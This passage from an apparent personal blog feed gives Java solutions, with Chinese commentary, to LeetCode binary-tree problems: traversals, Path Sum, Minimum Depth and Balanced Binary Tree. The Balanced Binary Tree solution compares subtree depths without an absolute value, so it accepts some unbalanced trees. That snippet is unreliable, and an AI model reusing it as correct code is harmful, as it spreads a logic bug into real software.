<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>使用递归(Recursion)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeInorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using recursiuon!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        helper(list,root);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(ArrayList&lt;Integer&gt; list, TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            helper(list,node.left);</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(node.val);</span><br><span class="line">        <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            helper(list,node.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>不说了，递归还是很容易理解的。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>中序遍历非递归借助栈的实现方法。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeInorderTraversal2</span></span>&#123;</span><br><span class="line">    <span class="comment">// Without using recursion!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.pop();</span><br><span class="line">                list.add(p.val);</span><br><span class="line">                node = p.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>Morris traversal</strong></p>
<blockquote>
<p>时间复杂度：O(n)<br>空间复杂度：O(1)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeInorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Morris Traversal !</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        TreeNode cur = root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.left==<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(cur.val);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode pre = cur.left;</span><br><span class="line">                <span class="keyword">while</span>(pre.right!=<span class="keyword">null</span> &amp;&amp; pre.right!=cur)&#123;</span><br><span class="line">                    pre = pre.right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(pre.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    pre.right = cur;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    list.add(cur.val);</span><br><span class="line">                    pre.right = <span class="keyword">null</span>;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>递归和非递归的思路应该注意。同时也应该熟练Morris Traversal。</p>
</blockquote>
]]></content>
      <tags>
        <tag>recursion(递归)</tag>
        <tag>LeetCode-medium</tag>
        <tag>Morris Traversal</tag>
        <tag>In-Order Traversal(中序遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>144. Binary Tree Preorder Traversal</title>
    <url>/2017/05/19/144-Binary-Tree-Preorder-Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the preorder traversal of its nodes’ values.</p>
<p>For example:<br>Given binary tree <code>{1,#,2,3}</code>,</p>
<pre><code>1
 \
  2
 /
3
</code></pre><p>return [1,2,3].</p>
<p>Note: Recursive solution is trivial, could you do it iteratively?</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>使用递归(Recursion)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePreorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using recursion!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        preorderHelper(list,root);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">preorderHelper</span><span class="params">(ArrayList&lt;Integer&gt; list, TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(node.val);</span><br><span class="line">        preorderHelper(list,node.left);</span><br><span class="line">        preorderHelper(list,node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>总的来说，递归的思路还是易于操作理解。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>主要借助栈，存取每一次的根节点，然后每次弹出栈顶元素，然后遍历右子树。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePreorderTraversal3</span></span>&#123;</span><br><span class="line">    <span class="comment">// Without using recursion!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(node.val);</span><br><span class="line">                stack.push(node);</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.pop();</span><br><span class="line">                node = p.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>仍然是不使用递归的思路，与Solution2不同的是，对于栈的使用有所不同。此方法中，更像是BFS的思路，按层来遍历，将每层的右节点存入栈中。然后利用栈的性质：“后进先出”，待到左节点为空时，再依次取出栈中元素。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePreorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            list.add(node.val);</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            node = node.left;</span><br><span class="line">            <span class="keyword">if</span>(node==<span class="keyword">null</span> &amp;&amp; !stack.empty())&#123;</span><br><span class="line">                node = stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution4"><a href="#Solution4" class="headerlink" title="Solution4"></a>Solution4</h2><blockquote>
<p>上述3种方法是最常用的遍历二叉树的方法，其时间、空间复杂度均为O(n)。<br>下面说一种名为Morris Traversal（莫里斯遍历），其时间复杂度为O(n)，但是由于没有借助栈，所以其空间复杂度为O(1)。</p>
</blockquote>
<p><strong>Morris traversal</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePreorderTraversal3</span></span>&#123;</span><br><span class="line">    <span class="comment">// Morris Traversal !</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        TreeNode cur = root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.left==<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(cur.val);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode pre = cur.left;</span><br><span class="line">                <span class="keyword">while</span>(pre.right!=<span class="keyword">null</span> &amp;&amp; pre.right!=cur)&#123;</span><br><span class="line">                    pre = pre.right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(pre.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    list.add(cur.val);</span><br><span class="line">                    pre.right = cur;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    pre.right = <span class="keyword">null</span>;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>介绍了四种遍历方法，分为三种类型：</p>
<ol>
<li>递归法，这种方式便于理解，代码简洁。</li>
<li>非递归法，两种思路，一种是利用栈存储根节点，然后每次弹出后访问其右孩子节点；另一种是按层，每次存储向左遍历的根节点的右孩子节点，然后当左节点为叶节点时，按照栈的顺序弹出栈中元素。</li>
<li>莫里斯遍历，利用对于是否访问过该节点判断是否是回溯还是第一次向下遍历。<br>对于先序，中序，后序的遍历，是用递归都是最易于理解的。使用循环操作是相对麻烦的。同时，对于栈的灵活应用也是应该值得学习的。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>recursion(递归)</tag>
        <tag>LeetCode-medium</tag>
        <tag>Pre-Order Traversal(先序遍历)</tag>
        <tag>Morris Traversal</tag>
      </tags>
  </entry>
  <entry>
    <title>112. Path Sum</title>
    <url>/2017/05/19/112-Path-Sum/</url>
    <content><![CDATA[<p>Given a binary tree and a sum, determine if the tree has a root-to-leaf path such that adding up all the values along the path equals the given sum.</p>
<p><strong>For example:</strong><br><br>Given the below binary tree and <code>sum = 22</code>,</p>
<pre><code>      5
     / \
    4   8
   /   / \
  11  13  4
 /  \      \
7    2      1
</code></pre><p>return true, as there exist a root-to-leaf path <code>5-&gt;4-&gt;11-&gt;2</code> which sum is 22.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>递归</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathSum</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>&amp;&amp;root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> sum==root.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hasPathSum(root.right,sum-root.val)||hasPathSum(root.left,sum-root.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>postorder traversal(后序遍历)</strong></p>
<blockquote>
<p>利用后序遍历找出符合条件的答案。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathSum</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">int</span> SUM = <span class="number">0</span>;</span><br><span class="line">        TreeNode node = root,pre=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                SUM += node.val;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;</span><br><span class="line">            node = stack.peek();</span><br><span class="line">            <span class="keyword">if</span>(node.left==<span class="keyword">null</span>&amp;&amp;node.right==<span class="keyword">null</span>&amp;&amp;sum==SUM)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="keyword">null</span> &amp;&amp; pre!=node.right)&#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                SUM -= node.val;</span><br><span class="line">                pre = node;</span><br><span class="line">                stack.pop();</span><br><span class="line">                node = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>另一种后序遍历的常用写法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathSum3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">int</span> SUM = <span class="number">0</span>;</span><br><span class="line">        TreeNode node = root,pre = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                SUM += node.val;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.peek();</span><br><span class="line">                <span class="keyword">if</span>(p.left==<span class="keyword">null</span>&amp;&amp;p.right==<span class="keyword">null</span>&amp;&amp;SUM==sum)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(p.right!=<span class="keyword">null</span>&amp;&amp;pre!=p.right)&#123;</span><br><span class="line">                    node = p.right;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    SUM -= p.val;</span><br><span class="line">                    pre = p;</span><br><span class="line">                    stack.pop();</span><br><span class="line">                    node = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>后序遍历的循环操作二叉树是需要理解下的。在本题中，需要再更进一步，利用栈来组合新的和。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Stack(栈)</tag>
        <tag>Post-Order Traversal(后序遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>111. Minimum Depth of Binary Tree</title>
    <url>/2017/05/11/111-Minimum-Depth-of-Binary-Tree/</url>
    <content><![CDATA[<p>Given a binary tree, find its minimum depth.</p>
<p>The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><h3 id="递归解决"><a href="#递归解决" class="headerlink" title="递归解决"></a>递归解决</h3><p><strong>Boundary Check(边界值检测)</strong></p>
<blockquote>
<p>从尾部向上递归：</p>
<ol>
<li>当前节点为空，返回0；</li>
<li>当前节点的左右节点均为空，返回1；</li>
<li>当前节点的左右节点中有一个为空，则应该返回不为空的节点的子树最小深度。</li>
<li>当前节点的左右节点均不为空，则应该返回深度小的节点。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MinimumDepthofBinaryTree</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using DFS</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>&amp;&amp;root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>||root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> Math.max(minDepth(root.left),minDepth(root.right))+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.min(minDepth(root.left),minDepth(root.right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Attention</strong></p>
<pre><code>if(root.left==null||root.right==null){
    return Math.max(minDepth(root.left),minDepth(root.right))+1;
}
</code></pre><blockquote>
<p>注意返回值，如果一个节点只存在一个左或者右节点，那么不这么写的话，会返回空节点的深度。</p>
</blockquote>
<pre><code>    1
   /
  2
 /
3
</code></pre><blockquote>
<p>对于这样的树，可能会返回深度1，因为右子树深度为0。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><h3 id="非递归解决"><a href="#非递归解决" class="headerlink" title="非递归解决"></a>非递归解决</h3><p><strong>BFS方案</strong></p>
<blockquote>
<p>按照广度优先<code>按层</code>遍历节点：</p>
<ol>
<li>某一结点的左右子树均为空，则应该返回当前深度。</li>
<li>其他情况则继续按照BFS遍历节点。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MinimumDepthofBinaryTree</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using BFS</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>&amp;&amp;root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">int</span> level = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = queue.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                TreeNode node = queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(node.left==<span class="keyword">null</span>&amp;&amp;node.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> level;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            level++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> level;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<ol>
<li>注意leaf node的定义，即没有左右子树；</li>
<li>注意此题中，对于一些边界检测的判断，只含有一个子树时，应该以存在的子树继续计算深度。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
        <tag>Optimize(优化)</tag>
        <tag>Boundary Check(边界值检测)</tag>
      </tags>
  </entry>
  <entry>
    <title>110. Balanced Binary Tree</title>
    <url>/2017/05/10/110-Balanced-Binary-Tree/</url>
    <content><![CDATA[<p>Given a binary tree, determine if it is height-balanced.</p>
<p>For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><blockquote>
<p>基本思路，遍历二叉树，递归算出每一个节点的左右子树高度，比较高度，不满足平衡二叉树，返回false；</p>
</blockquote>
<p><strong>递归解决</strong></p>
<blockquote>
<ol>
<li>从根结点开始向下遍历节点；</li>
<li>对每一个节点所构成的子树进行判断是否为平衡树；</li>
<li>继续递归该节点的左右节点（这个循环的嵌套值得研究）。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BalancedBinaryTree</span></span>&#123;</span><br><span class="line">    <span class="comment">/*Recursion!*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这里判断了当前节点的平衡，并递归了其左右子树</span></span><br><span class="line">        <span class="keyword">return</span> getDepth(root.left)-getDepth(root.right)&lt;=<span class="number">1</span>&amp;&amp;isBalanced(root.left)&amp;&amp;isBalanced(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDepth</span><span class="params">(TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(getDepth(node.left),getDepth(node.right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此时，由于需要对每一个节点进行平衡判断，每次都要取深度，那么时间复杂度是O(n)，需要对每一个节点都遍历，则时间复杂度是O(n2)。</p>
</blockquote>
<h2 id="Optimized-优化"><a href="#Optimized-优化" class="headerlink" title="Optimized(优化)"></a>Optimized(优化)</h2><blockquote>
